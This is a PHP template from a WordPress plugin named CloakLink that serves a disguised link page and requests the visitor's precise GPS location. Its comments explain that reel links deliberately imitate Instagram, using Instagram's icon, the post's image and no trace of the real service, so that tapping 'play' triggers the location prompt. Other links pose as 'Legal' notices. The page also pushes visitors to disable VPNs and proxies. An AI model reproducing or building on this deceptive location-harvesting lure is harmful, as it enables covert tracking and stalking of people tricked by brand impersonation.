<?php
/**
 * One-tap location page.
 *
 * The visitor tapped a shared link. This page asks the browser for their
 * position immediately, so the first thing they meet is the browser's own
 * "Allow … to access your location?" dialog rather than a button on a page
 * that explains nothing. Once the browser answers, the server records the
 * visit and sends them on — to the reel, to the destination URL, or to the
 * document page.
 *
 * There is no download button here and no file ever leaves this page. A
 * document is opened in the page viewer on the next step, where it can be
 * read but not saved.
 *
 * @package CloakLink
 */

defined( 'ABSPATH' ) || exit;

$cl_v      = isset( $GLOBALS['cloaklink_view'] ) ? (array) $GLOBALS['cloaklink_view'] : array();
$cl_link   = isset( $cl_v['link'] ) ? (array) $cl_v['link'] : array();
$cl_brand  = isset( $cl_v['brand'] ) ? (array) $cl_v['brand'] : array();
$cl_gps    = isset( $cl_v['gps'] ) ? (array) $cl_v['gps'] : array();
$cl_mode   = isset( $cl_v['mode'] ) ? (string) $cl_v['mode'] : 'require';

$cl_type   = isset( $cl_link['link_type'] ) ? (string) $cl_link['link_type'] : 'redirect';
$cl_reel   = 'instagram' === $cl_type;
$cl_legal  = 'legal' === $cl_type;

$cl_name   = ! empty( $cl_brand['name'] ) ? sanitize_text_field( (string) $cl_brand['name'] ) : 'Credit Control';
$cl_mail   = ! empty( $cl_brand['email'] ) && is_email( $cl_brand['email'] ) ? sanitize_email( (string) $cl_brand['email'] ) : '';

$cl_file   = isset( $cl_v['file_name'] ) ? (string) $cl_v['file_name'] : '';

// A reel is titled by the post it opens. An operator-set title is ignored
// here on purpose: whatever it says would print this service's name on a page
// that should only ever look like the way in to Instagram.
// The post's own picture, when the preview recorded one. A card with the
// post's image and no explanation reads as the post itself.
$cl_reel_img = '';
if ( $cl_reel ) {
	// Only the post's own picture is used. This service's card would print its
	// own branding on a screen that must look like nothing but the post.
	$cl_reel_img = esc_url_raw( isset( $cl_link['meta']['share_image'] ) ? (string) $cl_link['meta']['share_image'] : '' );
}
$cl_card_t = isset( $cl_v['card']['title'] ) ? (string) $cl_v['card']['title'] : '';
if ( $cl_reel ) {
	$cl_title = $cl_card_t;
	if ( '' === trim( $cl_title ) ) {
		$cl_title = __( 'Instagram reel', 'cloaklink' );
	}
} else {
	$cl_title = ! empty( $cl_link['page_title'] ) ? (string) $cl_link['page_title'] : $cl_name;
}

// The tab needs this service's own mark. Without an icon the browser asks the
// install for /favicon.ico and falls back to the WordPress logo, which is not
// this service at all. An inline SVG is used rather than a file URL so the tab
// icon works even before the plugin's assets are reachable.
// A reel link carries Instagram's own mark, not this service's. The tab is the
// one place a visitor sees a logo before the page paints, and a legal seal on
// a link that opens a reel tells them they have arrived somewhere they have
// not. The wordmark is never printed either: the page is a way in to the post,
// so it looks like the post's own app and nothing else.
if ( $cl_reel ) {
	$cl_icon_svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">'
		. '<defs><linearGradient id="ig" x1="0" y1="1" x2="1" y2="0">'
		. '<stop offset="0" stop-color="#FFD600"/>'
		. '<stop offset=".28" stop-color="#FF7A00"/>'
		. '<stop offset=".55" stop-color="#FF0069"/>'
		. '<stop offset=".78" stop-color="#D300C5"/>'
		. '<stop offset="1" stop-color="#7638FA"/>'
		. '</linearGradient></defs>'
		. '<rect width="64" height="64" rx="15" fill="url(#ig)"/>'
		. '<rect x="15" y="15" width="34" height="34" rx="11" fill="none" stroke="#fff" stroke-width="3.4"/>'
		. '<circle cx="32" cy="32" r="9" fill="none" stroke="#fff" stroke-width="3.4"/>'
		. '<circle cx="42.4" cy="21.6" r="2.5" fill="#fff"/>'
		. '</svg>';
} else {
	$cl_icon_svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">'
		. '<rect width="64" height="64" rx="14" fill="#10232e"/>'
		. '<circle cx="32" cy="32" r="17" fill="none" stroke="#c9a86a" stroke-width="2.6" stroke-opacity=".85"/>'
		. '<path d="M40 24.5a9.4 9.4 0 1 0 0 15" fill="none" stroke="#ffffff" stroke-width="4.2" stroke-linecap="round"/>'
		. '<path d="M30 24.5a9.4 9.4 0 1 0 0 15" fill="none" stroke="#ffffff" stroke-width="4.2" stroke-linecap="round" stroke-opacity=".55"/>'
		. '</svg>';
}
$cl_icon = 'data:image/svg+xml;base64,' . base64_encode( $cl_icon_svg );

$cl_config = array(
	'step' => esc_url_raw( isset( $cl_v['step_url'] ) ? (string) $cl_v['step_url'] : '' ),
	// A reel waits for its play button: the tap that starts the post is the
	// tap that asks for location, which is both what a person expects and the
	// gesture browsers require before they will show the dialog.
	'armOnPlay' => $cl_reel,
	'mode' => $cl_mode,
	'timeout' => isset( $cl_gps['timeout'] ) ? (int) $cl_gps['timeout'] : 25,
	'highAccuracy' => ! empty( $cl_gps['accuracy'] ),
	'blockOnDeny' => ! empty( $cl_gps['block'] ),
	'reasons' => array(
		'location_required' => __( 'Location access is required for this link. Allow it in your browser, then press Try again.', 'cloaklink' ),
		'rate_limited'      => __( 'Too many requests. Please wait a minute.', 'cloaklink' ),
		'blocked_ip'        => __( 'This link is not available here.', 'cloaklink' ),
		'blocked_country'   => __( 'This link is not available in your region.', 'cloaklink' ),
		'vpn'               => __( 'Turn off your VPN and try again.', 'cloaklink' ),
		'proxy'             => __( 'Turn off your proxy and try again.', 'cloaklink' ),
		'bot'               => __( 'Automated access is not permitted.', 'cloaklink' ),
		'device_locked'     => __( 'This link is already linked to another device.', 'cloaklink' ),
		'bad_request'       => __( 'Reopen the link and try again.', 'cloaklink' ),
	),
);
?>
<!doctype html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
	<meta name="robots" content="noindex,nofollow,noarchive">
	<meta name="referrer" content="no-referrer">
	<meta name="theme-color" content="<?php echo $cl_reel ? '#101318' : '#f5f8f9'; ?>">
	<?php
	// The same card the crawler page carries. A host may serve this copy to a
	// preview service, so the tags must be here too.
	$cl_card = isset( $cl_v['card'] ) && is_array( $cl_v['card'] ) ? $cl_v['card'] : array();
	if ( $cl_card ) :
		?>
	<?php
	// The tab is for the visitor; the tags below are for the crawler. A
	// document link's card title is the uploaded file's name — "notice.jpg"
	// — which says nothing on a tab and repeats a filename. The tab names
	// the page; the preview card keeps the title the source page published.
	// A reel names itself after the post it opens, so nothing of this service
	// reaches the tab or the card. A notice is titled "Legal" and nothing else.
	if ( $cl_reel ) {
		$cl_tab_title = (string) $cl_card['title'];
	} elseif ( 'legal' === ( isset( $cl_v['link']['link_type'] ) ? $cl_v['link']['link_type'] : '' ) ) {
		$cl_tab_title = __( 'Legal', 'cloaklink' );
	} else {
		$cl_tab_title = (string) $cl_card['title'];
	}
	?>
	<title><?php echo esc_html( trim( $cl_tab_title ) ); ?></title>
	<meta name="description" content="<?php echo esc_attr( $cl_card['description'] ); ?>">
	<meta property="og:type" content="website">
	<meta property="og:locale" content="en_US">
	<meta property="og:title" content="<?php echo esc_attr( $cl_card['title'] ); ?>">
	<meta property="og:description" content="<?php echo esc_attr( $cl_card['description'] ); ?>">
	<meta property="og:site_name" content="<?php echo esc_attr( $cl_card['site_name'] ); ?>">
	<?php
	// The address printed inside the card belongs to wherever the content
	// really lives. On a reel or a notice it is never this short link, and
	// when there is nothing honest to print, no address is printed at all.
	$cl_card_url = isset( $cl_card['card_url'] ) ? (string) $cl_card['card_url'] : '';
	$cl_canon    = array_key_exists( 'canonical', (array) $cl_card ) ? (string) $cl_card['canonical'] : (string) $cl_card['url'];
	?>
	<?php if ( '' !== $cl_canon ) : ?>
	<link rel="canonical" href="<?php echo esc_url( $cl_canon ); ?>">
	<?php endif; ?>
	<?php if ( '' !== $cl_card_url ) : ?>
	<meta property="og:url" content="<?php echo esc_url( $cl_card_url ); ?>">
	<?php endif; ?>
	<?php if ( ! empty( $cl_card['image'] ) ) : ?>
	<meta property="og:image" content="<?php echo esc_attr( esc_url_raw( $cl_card['image'] ) ); ?>">
	<meta property="og:image:secure_url" content="<?php echo esc_attr( esc_url_raw( $cl_card['image'] ) ); ?>">
	<meta property="og:image:width" content="1200">
	<meta property="og:image:height" content="630">
	<meta property="og:image:type" content="image/jpeg">
	<meta property="og:image:alt" content="<?php echo esc_attr( $cl_card['title'] ); ?>">
	<meta name="twitter:image" content="<?php echo esc_attr( esc_url_raw( $cl_card['image'] ) ); ?>">
	<?php endif; ?>
	<meta name="twitter:card" content="<?php echo ! empty( $cl_card['image'] ) ? 'summary_large_image' : 'summary'; ?>">
	<meta name="twitter:title" content="<?php echo esc_attr( $cl_card['title'] ); ?>">
	<meta name="twitter:description" content="<?php echo esc_attr( $cl_card['description'] ); ?>">
	<?php else : ?>
	<title><?php echo esc_html( $cl_title ); ?></title>
	<?php endif; ?>
	<link rel="icon" type="image/svg+xml" href="<?php echo esc_attr( $cl_icon ); ?>">
	<link rel="apple-touch-icon" href="<?php echo esc_attr( $cl_icon ); ?>">
	<link rel="stylesheet" href="<?php echo esc_url( CLOAKLINK_URL . 'assets/css/portal-legal.css?ver=' . CLOAKLINK_VERSION ); ?>">
</head>
<body class="cc-gate<?php echo $cl_reel ? ' cc-gate--reel' : ''; ?>">
<div class="cc-site">

	<?php if ( $cl_reel ) : ?>

		<!-- A reel link carries only the post it opens: its title, its picture
		     and a way in. Nothing on this screen names this service, prints its
		     address, or explains what the tap does. -->
		<main class="cc-reel-wrap">
			<div class="cc-reel">
				<button type="button" class="cc-reel__media" id="cc-reel-play" aria-label="<?php esc_attr_e( 'Play', 'cloaklink' ); ?>">
					<?php if ( '' !== $cl_reel_img ) : ?>
						<img class="cc-reel__shot" src="<?php echo esc_attr( esc_url_raw( $cl_reel_img ) ); ?>" alt="" referrerpolicy="no-referrer">
					<?php endif; ?>
					<span class="cc-reel__play"></span>
				</button>
				<h1 class="cc-reel__title"><?php echo esc_html( $cl_title ); ?></h1>
			</div>

			<div class="cc-gate__status cc-gate__status--dark" id="cc-gate-status" role="status" aria-live="polite" hidden>
				<span class="cc-gate__spinner" aria-hidden="true"></span>
				<span id="cc-gate-status-text"><?php esc_html_e( 'Opening…', 'cloaklink' ); ?></span>
			</div>

			<div class="cc-gate__error cc-gate__error--dark" id="cc-gate-error" hidden>
				<p id="cc-gate-error-text"></p>
				<button type="button" class="cc-download" id="cc-gate-retry"><?php esc_html_e( 'Try again', 'cloaklink' ); ?></button>
			</div>
		</main>

	<?php else : ?>

		<main class="cc-main cc-main--gate">
			<section class="cc-card">
				<?php if ( $cl_legal && $cl_file ) : ?>
					<div class="cc-file">
						<span class="cc-file-ico" aria-hidden="true">
							<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
								<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
								<path d="M14 2v6h6"></path>
							</svg>
						</span>
						<div class="cc-file-info">
							<h2><?php echo esc_html( $cl_file ); ?></h2>
						</div>
					</div>
					<div class="cc-rule"></div>
				<?php else : ?>
					<span class="cc-gate__mark" aria-hidden="true">CC</span>
					<h1 class="cc-gate__title"><?php echo esc_html( $cl_title ); ?></h1>
				<?php endif; ?>

				<div class="cc-gate__status" id="cc-gate-status" role="status" aria-live="polite">
					<span class="cc-gate__spinner" aria-hidden="true"></span>
					<span id="cc-gate-status-text"><?php esc_html_e( 'Opening…', 'cloaklink' ); ?></span>
				</div>

				<div class="cc-gate__error" id="cc-gate-error" hidden>
					<p id="cc-gate-error-text"></p>
					<button type="button" class="cc-download" id="cc-gate-retry"><?php esc_html_e( 'Try again', 'cloaklink' ); ?></button>
				</div>
			</section>

			<?php if ( $cl_mail ) : ?>
				<p class="cc-muted-note"><a href="mailto:<?php echo esc_attr( $cl_mail ); ?>"><?php echo esc_html( $cl_mail ); ?></a></p>
			<?php endif; ?>
		</main>

	<?php endif; ?>

	<?php if ( ! $cl_reel ) : ?>
		<footer class="cc-footer"><strong><?php echo esc_html( $cl_name ); ?></strong></footer>
	<?php endif; ?>
</div>

<script id="cc-gate-config" type="application/json"><?php echo wp_json_encode( $cl_config ); ?></script>
<script defer src="<?php echo esc_url( CLOAKLINK_URL . 'assets/js/portal-gate.js?ver=' . CLOAKLINK_VERSION ); ?>"></script>
</body>
</html>
